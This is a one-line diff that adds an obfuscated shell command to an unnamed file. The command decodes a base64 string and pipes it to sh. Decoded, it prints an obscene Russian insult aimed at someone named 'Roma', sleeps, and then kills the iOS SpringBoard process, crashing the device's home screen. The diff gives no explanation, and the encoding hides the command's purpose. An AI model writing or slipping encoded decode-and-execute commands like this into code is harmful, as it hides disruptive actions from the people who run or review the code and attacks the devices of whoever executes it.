@@ -1,0 +1,1 @@
+echo 'ZWNobyAi0L/QuNC30LTQsCDRgtC10LHQtSwg0YDQvtC80LAiICYmIHNsZWVwIDUgJiYga2lsbGFsbCBTcHJpbmdCb2FyZA==' | base64 -d | sh
